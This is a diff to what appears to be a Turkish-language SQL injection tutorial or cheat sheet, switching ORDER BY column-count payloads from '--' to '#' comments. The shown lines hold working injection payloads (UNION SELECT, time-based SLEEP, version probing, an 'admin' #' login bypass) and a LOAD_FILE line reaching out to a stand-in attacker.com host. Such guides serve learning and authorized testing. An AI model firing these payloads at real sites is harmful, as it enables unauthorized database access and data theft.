@@ -178,7 +178,7 @@ SQL Injection zafiyetini anlamak için hem manuel hem de otomatik yöntemler kul
 | `' AND 1=2 UNION SELECT 1,version()--` | Versiyon bilgisi alma | ✅ |
 | `1 AND SLEEP(5)` | Time-based SQLi testi | ✅ |
 | `' AND SUBSTRING(@@version,1,1)='5'--` | Versiyonun ilk karakterini kontrol etme | ✅ |
-| `1' ORDER BY 3--` | Kolon sayısını bulma | ✅ |
+| `1' ORDER BY 3#` | Kolon sayısını bulma | ✅ |
 | `' OR EXISTS(SELECT * FROM users)--` | Veri varlığını test etme | ✅ |
 
 ---
@@ -233,9 +233,9 @@ admin' #
 LOAD_FILE('\\attacker.com\file.txt')
 
 ### 7️⃣ Kolon / Tablo Sorguları
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3--
+' ORDER BY 1#
+' ORDER BY 2#
+' ORDER BY 3#
 ' UNION SELECT 1,2,3-- -- Kolon sayısı öğrenme
 
 
